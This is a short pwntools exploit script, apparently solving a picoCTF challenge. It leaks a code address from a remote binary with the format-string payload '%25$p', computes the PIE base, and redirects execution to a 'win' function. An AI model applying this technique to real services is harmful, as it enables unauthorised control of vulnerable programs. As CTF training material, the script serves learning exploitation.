# This one is the same from original PIE TIME, it just we need to leak the base address using format string vulnerability

from pwn import *
context.log_level = 'debug'
exe = ('./vuln')
binary = context.binary = ELF(exe)
p = remote('rescued-float.picoctf.net',59759)
p.sendlineafter(b':',b'%25$p') #Honestly I was kinda confused since there are some similiar address for the last LSB, but I guess this is the right one, the main address
main = binary.symbols.main
a = int(p.recvline().strip().decode(),16)
print(hex(a))
base = a - main
print(hex(base))
win = binary.symbols.win
print(hex(win))
payload = base + win
print(hex(payload))
p.sendlineafter(b':',hex(payload))
p.recvline()
p.interactive()
